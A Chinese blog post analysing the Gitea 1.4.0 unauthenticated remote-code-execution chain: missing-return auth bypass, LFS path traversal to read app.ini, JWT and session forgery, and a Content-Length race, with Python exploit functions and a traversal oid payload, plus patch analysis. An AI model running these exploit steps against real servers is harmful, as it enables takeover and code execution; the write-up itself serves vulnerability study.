---
title: Gitea 1.4.0未授权远程代码执行漏洞分析
date: 2018-07-17 17:52:10
tags: [vul,sec,Gitea]
categories: Security
---
<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

近日，Gitea 1.4.0版本的`LFS`模块出现了一个绕过登录验证未授权创建LFS对象的漏洞，由此漏洞引申出了一条非常漂亮的攻击链，值得好好学习。

### 0x00 基本介绍

官网地址 https://gitea.io/en-us/

> Gitea is a community managed [fork](https://blog.gitea.io/2016/12/welcome-to-gitea/) of [Gogs](https://gogs.io/), lightweight code hosting solution written in [Go](https://golang.org/) and published under the [MIT](https://github.com/go-gitea/gitea/blob/master/LICENSE) license.

Git LFS 介绍 

> Git 大文件存储（Large File Storage，简称LFS）目的是更好地把大型二进制文件，比如音频文件、数据集、图像和视频等集成到 Git 的工作流中。我们知道，Git 存储二进制效率不高，因为它会压缩并存储二进制文件的所有完整版本，随着版本的不断增长以及二进制文件越来越多，这种存储方案并不是最优方案。而 LFS 处理大型二进制文件的方式是用文本指针替换它们，这些文本指针实际上是包含二进制文件信息的文本文件。文本指针存储在 Git 中，而大文件本身通过HTTPS托管在Git LFS服务器上。 

本次漏洞是出现在`Gitea`的`LFS`处理逻辑中，在进行权限验证的时候少了一行`return`语句，以至于即使在`401 Unauthorized`的时候依旧能够进行后续的操作，这是整个漏洞的导火索。

### 0x01 环境搭建

使用docker搭建漏洞环境，`Gitea`版本1.4.0

https://docs.gitea.io/en-us/install-with-docker/

docker-compose.yml

```
version: "2"

networks:
  gitea:
    external: false

services:
  server:
    image: gitea/gitea:1.4.0
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
    networks:
      - gitea
    volumes:
      - ./gitea:/data
    ports:
      - "3000:3000"
      - "222:22"
    depends_on:
      - db

  db:
    image: mysql:5.7
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=gitea
      - MYSQL_USER=gitea
      - MYSQL_PASSWORD=gitea
      - MYSQL_DATABASE=gitea
    networks:
      - gitea
    volumes:
      - ./mysql:/var/lib/mysql
    ports:
      - "3306:3306"
```

安装时指定`mysql`连接需要`vps_ip:3306`，使用`localhost:3306`一直提示错误

### 0x02 逻辑漏洞

https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218

```go
// PostHandler instructs the client how to upload data
func PostHandler(ctx *context.Context) {
    //...
    if !authenticate(ctx, repository, rv.Authorization, true) {
		requireAuth(ctx)
	}
	//...
}
func requireAuth(ctx *context.Context) {
	ctx.Resp.Header().Set("WWW-Authenticate", "Basic realm=gitea-lfs")
	writeStatus(ctx, 401)
}
```

问题出在`PostHandler()`方法，该方法的作用是创建一个新的`LFS`对象。在`requireAuth`处，如果权限验证失败，则执行`requireAuth ()`，返回`401认证失败`，关键是`requireAuth(ctx)`结束之后没有`return`，也就是说虽然返回`401`但是不影响后面的逻辑接着执行，因此可以创建任意`LFS`对象，此处存在一个权限绕过漏洞。

### 0x03  目录穿越&任意文件读取

参考文档 https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md

```go
// Get takes a Meta object and retrieves the content from the store, returning
// it as an io.Reader. If fromByte > 0, the reader starts from that byte
func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte int64) (io.ReadCloser, error) {
	path := filepath.Join(s.BasePath, transformKey(meta.Oid))

	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	if fromByte > 0 {
		_, err = f.Seek(fromByte, os.SEEK_CUR)
	}
	return f, err
}
```

从`lfs`下载文件接口是`modules/lfs/content_store.go:Get()`方法，从`meta.Oid`取路径去读取，这个路径处理函数是`transformKey()`

```go
func transformKey(key string) string {
	if len(key) < 5 {
		return key
	}

	return filepath.Join(key[0:2], key[2:4], key[4:])
}
```

可以看到`transformKey()`方法是把key参数做了三次分割，先取两个字符，加上`/`，然后再取两个，再加上`/`，最后拼接后面部分，举例说明：

`abcdefgh -> ab/cd/efgh`

于是此处就可以构造`..../etc/passwd`的格式，经过`transformKey()`后被转换成`../../etc/passwd`，这样就存在一个任意文件读取漏洞。

在`Gitea`中有一个关键配置文件`app.ini`，其中记录了默认配置信息，包括数据库连接密码，一些路径和`token`，以及LFS 认证密钥 ，该密钥用来加密JWT认证

配置项更详细信息可以参考[文档](https://docs.gitea.io/zh-cn/config-cheat-sheet/)

当前环境中`app.ini`位置在`/data/gitea/conf/app.ini`，所以需要构造`....gitea/conf/app.ini`，经过处理变成`/data/gitea/lfs/../../gitea/conf/app.ini`，也就是`/data/gitea/conf/app.ini`，这样就能读取到配置文件，注意需要对`/`进行`url`编码

访问LFS存储对象的接口是`https://git-server.com/foo/bar.git/info/lfs/objects/batch`

![1531882119588](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531882119588.png)

由此我们获取到了`LFS_JWT_SECRET`

### 0x04 构造Authorization

LFS接口认证过程使用了JWT或Basic认证，[官网介绍](https://jwt.io/introduction/)JWT：

> `JSON Web Token (JWT)` is an open standard ([RFC 7519](https://tools.ietf.org/html/rfc7519)) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the **HMAC** algorithm) or a public/private key pair using **RSA** or **ECDSA**.
>
> Although JWTs can be encrypted to also provide secrecy between parties, we will focus on *signed* tokens. Signed tokens can verify the *integrity* of the claims contained within it, while encrypted tokens *hide* those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.

所以我们一旦获得了`LFS_JWT_SECRET`，就可以自己构造JWT认证，从而在不知道管理员账户密码的情况下取得LFS的完整控制权。

在`modules/lfs/server.go`定义了LFS接口认证登录的方法：

```go
func parseToken(authorization string) (*models.User, *models.Repository, string, error) {
	if authorization == "" {
		return nil, nil, "unknown", fmt.Errorf("No token")
	}
	if strings.HasPrefix(authorization, "Bearer ") {
		token, err := jwt.Parse(authorization[7:], func(t *jwt.Token) (interface{}, error) {
			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method: %v", t.Header["alg"])
			}
			return setting.LFS.JWTSecretBytes, nil
		})
		if err != nil {
			return nil, nil, "unknown", err
		}
		claims, claimsOk := token.Claims.(jwt.MapClaims)
		if !token.Valid || !claimsOk {
			return nil, nil, "unknown", fmt.Errorf("Token claim invalid")
		}
		opStr, ok := claims["op"].(string)
		if !ok {
			return nil, nil, "unknown", fmt.Errorf("Token operation invalid")
		}
		repoID, ok := claims["repo"].(float64)
		if !ok {
			return nil, nil, opStr, fmt.Errorf("Token repository id invalid")
		}
		r, err := models.GetRepositoryByID(int64(repoID))
		if err != nil {
			return nil, nil, opStr, err
		}
		userID, ok := claims["user"].(float64)
		if !ok {
			return nil, r, opStr, fmt.Errorf("Token user id invalid")
		}
		u, err := models.GetUserByID(int64(userID))
		if err != nil {
			return nil, r, opStr, err
		}
		return u, r, opStr, nil
	}
    if strings.HasPrefix(authorization, "Basic ") {
        //...
    }
    return nil, nil, "unknown", fmt.Errorf("Token not found")
}
```

可以看到构成JWT的`payload`部分需要包含这么几个字段：

```json
{
  "user": 1,
  "repo": 1,
  "op": "upload",
  "nbf": 1445408221,
  "exp": 1618208221
}
```

分别是用户id，LFS项目id，LFS操作，以及`HTTPAuth`有效时间

我们在[JWT debugger页面](https://jwt.io/#debugger)测试生成一段`Auth Token`，填入`payload`和上一步获取到的`LFS_JWT_SECRET`，于是得到了LFS认证的`Authorization`

![1531883703859](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531883703859.png)



### 0x05 伪造session绕过登录

在`modules/lfs/server.go` 定义了LFS中的路由接口

```go
// ObjectOidHandler is the main request routing entry point into LFS server functions
func ObjectOidHandler(ctx *context.Context) {
	if !setting.LFS.StartServer {
		writeStatus(ctx, 404)
		return
	}
	if ctx.Req.Method == "GET" || ctx.Req.Method == "HEAD" {
		if MetaMatcher(ctx.Req) {
			getMetaHandler(ctx)
			return
		}
		if ContentMatcher(ctx.Req) || len(ctx.Params("filename")) > 0 {
			getContentHandler(ctx)
			return
		}
	} else if ctx.Req.Method == "PUT" && ContentMatcher(ctx.Req) {
		PutHandler(ctx)
		return
	}
}
```

其中写入文件接口是在`PutHandler()`，需要使用`PUT`方法。跟入`Put()`看一下

```go
// Put takes a Meta object and an io.Reader and writes the content to the store.
func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.Reader) error {
	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
	tmpPath := path + ".tmp"

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0750); err != nil {
		return err
	}

	file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0640)
	if err != nil {
		return err
	}
	defer os.Remove(tmpPath)

	hash := sha256.New()
	hw := io.MultiWriter(hash, file)

	written, err := io.Copy(hw, r)
	if err != nil {
		file.Close()
		return err
	}
	file.Close()

	if written != meta.Size {
		return errSizeMismatch
	}

	shaStr := hex.EncodeToString(hash.Sum(nil))
	if shaStr != meta.Oid {
		return errHashMismatch
	}

	return os.Rename(tmpPath, path)
}
```

可以看到该方法主要是先创建临时文件，以`.tmp`结尾，然后对文件进行了一系列校验，包括文件大小和`Oid`信息，两者如果任一不匹配的话就写入失败，同时删除临时文件。注意这行语句

`defer os.Remove(tmpPath)`

> `defer`用于资源的释放，会在函数返回之前进行调用。

也就是说不管函数是否返回错误，结束时都会删除临时文件。 

这时就要考虑两点：

1. 在文件被删除之前利用；
2. 如何利用后缀为.tmp的文件；

先考虑第一个问题，在文件被删除之前访问到这个文件。这种情况让我们想到在上传webshell时可以利用的条件竞争漏洞，在文件被删除之前使用多线程并发访问，利用时间差访问到上传文件然后生成shell。但是这个方法在此处不适用，根据作者想出的办法，利用`Content-Length`字段，该字段告诉服务器该请求需要发送多少长度的数据， 在传输完成之前服务器会处于一直等待阶段。假设我们设置了一个超长的`Content-Length`，服务器就会认为数据还没有传输完成便挂起等待，这个时间段内我们就可以访问到上传的文件。

接着考虑第二个问题，如何利用`.tmp`文件？

在`Gitea`可以配置存储session的方式，默认是保存为文件，存储路径在`/data/gitea/sessions`。

```
//app.ini
[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER        = file
```

于是我们可以想到把上面生成的session内容写入到一个`.tmp`文件，并保存在session目录下，这个tmp文件名即为`sessionid`，然后利用条件竞争，在文件未被删除之前带上这个`sessionid`，就可以登录成功。

`Gitea`使用的session模块是[go-macaron/session](https://github.com/go-macaron/session)，在`file.go`可以看到几个关键的方法

```go
// Release releases resource and save data to provider.
func (s *FileStore) Release() error {
	s.p.lock.Lock()
	defer s.p.lock.Unlock()

	data, err := EncodeGob(s.data)
	if err != nil {
		return err
	}

	return ioutil.WriteFile(s.p.filepath(s.sid), data, os.ModePerm)
}
```

调用了`EncodeGob()`方法

```go
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
	for _, v := range obj {
		gob.Register(v)
	}
	buf := bytes.NewBuffer(nil)
	err := gob.NewEncoder(buf).Encode(obj)
	return buf.Bytes(), err
}
```

然后写入文件

```go
func (p *FileProvider) filepath(sid string) string {
	return path.Join(p.rootPath, string(sid[0]), string(sid[1]), sid)
}
```

可以看到session的生成是通过特有的Gob序列化后保存成文件，路径特点是`sid[0]/sid[1]/sid `

我们来分析一个认证成功的session`/data/gitea/sessions/0/9/09cfb25c946d6187`，前两位为路径名，后面为sid，共同组成一个session文件

我们使用相应的`DecodeGob()`方法(vendor/github.com/go-macaron/session/utils.go:47)来解开看一下session里包含的内容，其中`session_data`即是`session`文件的hex内容。代码如下

```go
package main

import (
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"bytes"
)

func DecodeGob(encoded []byte) (out map[interface{}]interface{}, err error) {
	buf := bytes.NewBuffer(encoded)
	err = gob.NewDecoder(buf).Decode(&out)
	return out, err
}

func main() {
	session_data := "0EFF81040102...03000131"	//太长省略
	buf, err := hex.DecodeString(session_data)
	fmt.Println(buf)
	if err != nil {
		fmt.Println(err)
	}
	decode_data, err := DecodeGob(buf)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(decode_data)
}
```

运行结果：

![1531898336305](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898336305.png)

可以看到主要是以`_old_iod` `uid` `uname`三个值组成的session内容，那么我们就可以构造一组这样的值来伪造一个session

`[uid:1 uname:admin123 _old_uid:1]`

生成session使用`EncodeGob()`方法：

```go
package main

import (
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"bytes"
)

func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
	for _, v := range obj {
		gob.Register(v)
	}
	buf := bytes.NewBuffer(nil)
	err := gob.NewEncoder(buf).Encode(obj)
	return buf.Bytes(), err
}

func main() {
	//var uid = 1
	//uname := "admin123"
	obj := map[interface{}]interface{}{"_old_iod": "1", "uid": 1, "uname": "admin123"}
	buf, err := EncodeGob(obj)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(buf)
	encode_data := hex.EncodeToString(buf)
	fmt.Println(encode_data)
}
```

运行之后生成一个hex序列

![1531898708274](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898708274.png)

这段序列里就包含了session信息，包括 `_old_iod` `uid` `uname`，然后我们可以利用这个伪造的`session`成功登录



### 0x06 漏洞利用

##### 1. 读取`app.ini`，获得`LFS_JWT_SECRET`

![1531882119588](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531882119588.png)

##### 2. 针对`session`文件名创建`LFS`对象

```python
def create_lfs_object(session):
    oid = '....gitea/sessions/1/1/11session'
    data = {
        "Oid": oid,
        "Size": 1000,
        "User": "a",
        "Password": "a",
        "Repo": "a",
        "Authorization": "a"
    }

    url = '%s.git/info/lfs/objects' % (GIT_URL)
    response = session.post(
        url,
        json=data,
        headers={
            'Accept': 'application/vnd.git-lfs+json'
        }
    )
    logging.info(response.text)
```

##### 3. 生成`Authorization`

![1531883703859](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531883703859.png)

##### 4. 生成`session`数据

![1531898708274](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531898708274.png)

##### 5. 写入`session`数据

```python
def write_session(session):
    oid = '....gitea/sessions/1/1/11session'
    url = '%s.git/info/lfs/objects/%s' % (GIT_URL, urllib.quote(oid, safe=''))
    print url
    response = session.put(url, data=gen_data(), headers={
        'Accept': 'application/vnd.git-lfs',
        'Content-Type': 'application/vnd.git-lfs',
        'Authorization': 'Bearer ' + AUTH_TOKEN
    })
    logging.info(response.text)
```

其中`gen_data()`使用生成器来延迟响应时间，在这段时间内`.tmp`文件未被删除

```python
def gen_data():
    yield SESSION_DATA
    time.sleep(300)
```

`HEX_DATA`是生成的`session`数据

```python
HEX_DATA = '0eff81040102ff8...d696e313233'	//hex_data
SESSION_DATA = HEX_DATA.decode('hex')
```

##### 6. 修改Session

![1531905605099](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531905605099.png)

后续利用`Git Hooks`自动执行命令就不多说了

![1531905731043](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531905731043.png)

### 0x07 补丁分析
https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9

分析补丁主要做了三块工作：

1. 首先把缺少的`return`给补上了
2. 限定了`oid`参数值必须符合`sha256`格式，如果查询的`oid`不存在则返回404，这样我们就无法指定任意`oid`值

![1531798747694](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531798747694.png)

3. 然后使用`path.Clean()`方法过滤多余的`.`和`/`，限制`repo`里不能出现`.`和`/`字符

![1531804973465](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531804973465.png)

![1531804989614](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1531804989614.png)

### 0x08 总结

该漏洞利用非常巧妙，由一处缺少的`return`层层深入，从权限绕过到文件读取，从伪造session到条件竞争，到最后的远程代码执行，一条漏洞链就串起来了，可谓十分精彩，也从侧面反映了一处小疏忽也会导致严重的后果。



参考：

https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html

https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html







<script>pangu.spacingPage();</script>